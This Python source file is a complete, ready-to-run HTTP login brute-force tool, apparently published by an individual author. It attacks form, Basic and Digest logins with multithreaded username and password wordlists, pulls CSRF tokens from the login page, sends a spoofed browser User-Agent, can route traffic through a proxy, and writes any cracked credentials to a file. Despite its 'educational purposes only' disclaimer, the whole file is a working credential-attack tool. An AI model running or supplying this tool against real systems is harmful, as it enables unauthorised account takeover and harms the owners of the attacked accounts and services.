#!/usr/bin/env python3
"""
http_bruteforce.py — HTTP Login Brute-Force Tool
Author  : Noé Jimenez-Greverent
GitHub  : github.com/Noejimgre
Version : 1.0

Supports: POST form login, HTTP Basic Auth, custom headers, proxy, rate limiting
Wordlists: compatible with rockyou.txt, SecLists, custom lists

⚠️  Educational purposes only.
    Use exclusively on systems you own or have explicit written permission to test.
    Unauthorized brute-force attacks are illegal.
"""

import requests
import argparse
import threading
import sys
import time
import json
from queue import Queue, Empty
from datetime import datetime
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────
#  BANNER & CONFIG
# ─────────────────────────────────────────────

BANNER = r"""
  _   _ _____ _____ ____    ____  ____  _   _ _____ _____ _____ ____   ____ _____
 | | | |_   _|_   _|  _ \  | __ )|  _ \| | | |_   _| ____|  ___/ ___| |  __|_   _|
 | |_| | | |   | | | |_) | |  _ \| |_) | | | | | | |  _| | |_  \___ \ | |_   | |
 |  _  | | |   | | |  __/  | |_) |  _ <| |_| | | | | |___|  _|  ___) ||  _|  | |
 |_| |_| |_|   |_| |_|     |____/|_| \_\\___/  |_| |_____|_|   |____/ |_|    |_|

           HTTP Brute-Force Tool v1.0 — github.com/Noejimgre
           ⚠  Authorized testing only — own systems or CTF labs only
"""

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}

# Common failure indicators
DEFAULT_FAILURE_STRINGS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "unauthorized", "bad credentials", "login failed",
    "mot de passe incorrect", "identifiant incorrect",
    "username or password", "invalid username",
]

# Common success indicators
DEFAULT_SUCCESS_STRINGS = [
    "dashboard", "welcome", "logout", "profile", "account",
    "sign out", "déconnexion", "tableau de bord",
]


class Colors:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"
    C="\033[96m"; W="\033[0m";  B="\033[1m"; D="\033[2m"

def pr(text, color=Colors.W, end="\n"):
    print(f"{color}{text}{Colors.W}", end=end, flush=True)


# ─────────────────────────────────────────────
#  RESULT TRACKER (thread-safe)
# ─────────────────────────────────────────────

class Results:
    def __init__(self):
        self.lock       = threading.Lock()
        self.found      = None       # (username, password) when cracked
        self.attempts   = 0
        self.start_time = datetime.now()
        self.stop_event = threading.Event()

    def mark_found(self, username, password):
        with self.lock:
            if self.found is None:
                self.found = (username, password)
                self.stop_event.set()

    def increment(self):
        with self.lock:
            self.attempts += 1
            return self.attempts

    def rate(self):
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return self.attempts / elapsed if elapsed > 0 else 0


# ─────────────────────────────────────────────
#  ATTACK MODES
# ─────────────────────────────────────────────

def try_post_form(session, url, username, password, user_field, pass_field,
                  extra_data, failure_strings, success_strings,
                  success_codes, failure_codes, results):
    """POST form-based login attempt."""
    data = {user_field: username, pass_field: password}
    if extra_data:
        data.update(extra_data)

    try:
        r = session.post(url, data=data, timeout=8,
                         allow_redirects=True, verify=False)

        # Check status code
        if failure_codes and r.status_code in failure_codes:
            return False
        if success_codes and r.status_code in success_codes:
            results.mark_found(username, password)
            return True

        # Check body content
        body = r.text.lower()
        for s in failure_strings:
            if s.lower() in body:
                return False
        for s in success_strings:
            if s.lower() in body:
                results.mark_found(username, password)
                return True

        # Redirect to different URL often means success
        if r.url != url and "login" not in r.url.lower():
            results.mark_found(username, password)
            return True

    except requests.exceptions.ConnectionError:
        pr("\n[!] Connection refused. Is the target up?", Colors.R)
    except requests.exceptions.Timeout:
        pass
    except Exception as e:
        pr(f"\n[!] Error: {e}", Colors.Y)

    return False


def try_basic_auth(session, url, username, password, results):
    """HTTP Basic Authentication attempt."""
    try:
        r = session.get(url, auth=(username, password),
                        timeout=8, verify=False)
        if r.status_code == 200:
            results.mark_found(username, password)
            return True
        return False
    except Exception:
        return False


def try_digest_auth(session, url, username, password, results):
    """HTTP Digest Authentication attempt."""
    from requests.auth import HTTPDigestAuth
    try:
        r = session.get(url, auth=HTTPDigestAuth(username, password),
                        timeout=8, verify=False)
        if r.status_code == 200:
            results.mark_found(username, password)
            return True
        return False
    except Exception:
        return False


# ─────────────────────────────────────────────
#  WORKER THREAD
# ─────────────────────────────────────────────

def worker(q, args, results, session):
    """Worker thread — pull (username, password) from queue and test."""
    while not results.stop_event.is_set():
        try:
            username, password = q.get(timeout=0.5)
        except Empty:
            break

        attempt_num = results.increment()

        # Progress display
        if attempt_num % 50 == 0 or args.verbose:
            elapsed = (datetime.now() - results.start_time).total_seconds()
            rate    = results.rate()
            pr(
                f"\r  [{attempt_num:>7}] {username}:{password[:20]:<20} "
                f"| {rate:.0f} req/s | {elapsed:.0f}s",
                Colors.D, end=""
            )

        # Perform the attack
        success = False
        if args.mode == "form":
            extra = {}
            if args.extra_data:
                for item in args.extra_data:
                    k, v = item.split("=", 1)
                    extra[k] = v
            success = try_post_form(
                session, args.url, username, password,
                args.user_field, args.pass_field,
                extra,
                args.failure_string or DEFAULT_FAILURE_STRINGS,
                args.success_string or DEFAULT_SUCCESS_STRINGS,
                args.success_code, args.failure_code,
                results
            )
        elif args.mode == "basic":
            success = try_basic_auth(session, args.url, username, password, results)
        elif args.mode == "digest":
            success = try_digest_auth(session, args.url, username, password, results)

        if success:
            pr(f"\n\n{'='*55}", Colors.G)
            pr(f"  [✓] CREDENTIALS FOUND!", Colors.G)
            pr(f"  Username : {username}", Colors.G)
            pr(f"  Password : {password}", Colors.G)
            pr(f"{'='*55}\n", Colors.G)

        # Rate limiting
        if args.delay > 0:
            time.sleep(args.delay)

        q.task_done()


# ─────────────────────────────────────────────
#  SETUP HELPERS
# ─────────────────────────────────────────────

def build_session(args) -> requests.Session:
    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    if args.header:
        for h in args.header:
            k, v = h.split(":", 1)
            session.headers[k.strip()] = v.strip()
    if args.cookie:
        for c in args.cookie:
            k, v = c.split("=", 1)
            session.cookies.set(k.strip(), v.strip())
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    return session


def load_wordlist(path: str) -> list:
    try:
        with open(path, "r", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip()]
        pr(f"  [+] Loaded {len(words):,} entries from {path}", Colors.G)
        return words
    except FileNotFoundError:
        pr(f"  [!] Wordlist not found: {path}", Colors.R)
        sys.exit(1)


def build_credential_queue(args) -> Queue:
    q = Queue()

    if args.mode in ["form", "basic", "digest"]:
        # User list + password list (credential stuffing / password spray)
        users     = load_wordlist(args.userlist) if args.userlist else [args.username]
        passwords = load_wordlist(args.passlist)

        for user in users:
            for pwd in passwords:
                q.put((user, pwd))

    pr(f"  [+] Queue: {q.qsize():,} credential pairs to test", Colors.C)
    return q


def get_csrf_token(session, url, token_field="csrf_token") -> str | None:
    """Try to extract a CSRF token from the login page."""
    try:
        from html.parser import HTMLParser
        r = session.get(url, verify=False, timeout=8)

        class TokenParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.token = None
            def handle_starttag(self, tag, attrs):
                if tag == "input":
                    attrs_dict = dict(attrs)
                    if attrs_dict.get("name") == token_field:
                        self.token = attrs_dict.get("value")

        parser = TokenParser()
        parser.feed(r.text)
        if parser.token:
            pr(f"  [+] CSRF token found: {parser.token[:20]}...", Colors.G)
        return parser.token
    except Exception:
        return None


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

def main():
    pr(BANNER, Colors.C)

    parser = argparse.ArgumentParser(
        description="HTTP Login Brute-Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Target
    parser.add_argument("url", help="Target URL (e.g. http://localhost/login)")
    parser.add_argument("--mode", choices=["form", "basic", "digest"],
                        default="form", help="Attack mode (default: form)")

    # Credentials
    creds = parser.add_argument_group("Credentials")
    creds.add_argument("--username", "-u",
                       help="Single username to test")
    creds.add_argument("--userlist", "-U",
                       help="Path to username wordlist")
    creds.add_argument("--passlist", "-P", required=True,
                       help="Path to password wordlist")

    # Form config (for form mode)
    form = parser.add_argument_group("Form settings (--mode form)")
    form.add_argument("--user-field",  default="username",
                      help="HTML form field name for username (default: username)")
    form.add_argument("--pass-field",  default="password",
                      help="HTML form field name for password (default: password)")
    form.add_argument("--extra-data",  nargs="+",
                      help="Additional POST fields as KEY=VALUE (e.g. --extra-data submit=Login)")
    form.add_argument("--csrf-field",
                      help="Auto-fetch CSRF token from login page (provide field name)")

    # Detection
    detect = parser.add_argument_group("Detection")
    detect.add_argument("--failure-string", nargs="+",
                        help="Strings indicating login failure (overrides defaults)")
    detect.add_argument("--success-string", nargs="+",
                        help="Strings indicating login success (overrides defaults)")
    detect.add_argument("--success-code", type=int, nargs="+",
                        help="HTTP status codes indicating success (e.g. 302)")
    detect.add_argument("--failure-code", type=int, nargs="+",
                        help="HTTP status codes indicating failure (e.g. 401)")

    # HTTP options
    http = parser.add_argument_group("HTTP options")
    http.add_argument("--header",  nargs="+", metavar="H",
                      help="Custom headers as 'Name: Value'")
    http.add_argument("--cookie",  nargs="+", metavar="C",
                      help="Cookies as 'name=value'")
    http.add_argument("--proxy",
                      help="Proxy URL (e.g. http://127.0.0.1:8080 for Burp Suite)")

    # Performance
    perf = parser.add_argument_group("Performance")
    perf.add_argument("--threads", "-t", type=int, default=10,
                      help="Number of threads (default: 10)")
    perf.add_argument("--delay",   "-d", type=float, default=0,
                      help="Delay between requests in seconds (default: 0)")
    perf.add_argument("--verbose", "-v", action="store_true",
                      help="Show every attempt")

    args = parser.parse_args()

    # Validate
    if not args.username and not args.userlist:
        pr("[!] Provide --username or --userlist", Colors.R)
        sys.exit(1)

    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        pr(f"[!] Invalid URL: {args.url}", Colors.R)
        sys.exit(1)

    pr(f"\n{'─'*55}", Colors.C)
    pr(f"  TARGET    : {args.url}", Colors.B)
    pr(f"  MODE      : {args.mode.upper()}", Colors.B)
    pr(f"  THREADS   : {args.threads}", Colors.B)
    pr(f"  DELAY     : {args.delay}s", Colors.B)
    if args.proxy:
        pr(f"  PROXY     : {args.proxy}", Colors.Y)
    pr(f"{'─'*55}\n", Colors.C)

    # Build session
    session = build_session(args)

    # CSRF token
    if args.csrf_field:
        token = get_csrf_token(session, args.url, args.csrf_field)
        if token and args.extra_data:
            args.extra_data.append(f"{args.csrf_field}={token}")
        elif token:
            args.extra_data = [f"{args.csrf_field}={token}"]

    # Load wordlists and build queue
    q       = build_credential_queue(args)
    total   = q.qsize()
    results = Results()

    pr(f"\n  [*] Starting at {datetime.now().strftime('%H:%M:%S')}", Colors.C)
    pr(f"  [*] Press Ctrl+C to stop\n", Colors.D)

    # Launch threads
    threads = []
    for _ in range(min(args.threads, total)):
        t = threading.Thread(
            target=worker,
            args=(q, args, results, session),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        pr("\n\n[!] Interrupted by user.", Colors.Y)
        results.stop_event.set()

    # Final summary
    elapsed = (datetime.now() - results.start_time).total_seconds()
    pr(f"\n{'─'*55}", Colors.C)
    pr(f"  RESULTS", Colors.B)
    pr(f"{'─'*55}", Colors.C)
    pr(f"  Attempts  : {results.attempts:,} / {total:,}")
    pr(f"  Duration  : {elapsed:.1f}s")
    pr(f"  Rate      : {results.rate():.0f} req/s")

    if results.found:
        user, pwd = results.found
        pr(f"\n  [✓] FOUND  →  {user}:{pwd}", Colors.G)
        # Save result
        result_file = f"found_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(result_file, "w") as f:
            json.dump({
                "target": args.url, "username": user,
                "password": pwd, "date": datetime.now().isoformat()
            }, f, indent=2)
        pr(f"  [+] Saved  →  {result_file}", Colors.G)
    else:
        pr(f"\n  [-] No credentials found in wordlist.", Colors.Y)

    pr(f"\n{'─'*55}\n", Colors.C)


if __name__ == "__main__":
    main()
